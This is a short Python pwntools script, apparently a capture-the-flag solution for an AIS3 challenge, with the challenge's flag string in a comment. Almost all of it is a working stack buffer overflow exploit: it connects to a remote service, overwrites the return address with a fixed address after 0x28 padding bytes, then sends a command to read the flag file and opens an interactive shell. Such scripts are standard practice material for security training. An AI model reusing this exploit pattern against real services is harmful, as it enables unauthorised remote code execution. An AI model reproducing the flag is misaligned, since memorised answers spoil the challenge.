#!/usr/bin/env python
# -*- coding: ascii -*-
from pwn import *

# AIS3{buffer_overfl0w_is_a_pi3c3_of_c4ke_f0r_y0u}



context.arch = 'amd64'


host , port = 'pwnhub.tw' , 11111
#host , port = '192.168.78.141' , 4000
y = remote( host , port )


y.sendline( 'D' * 0x28 + p64( 0x400654 ) )

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()

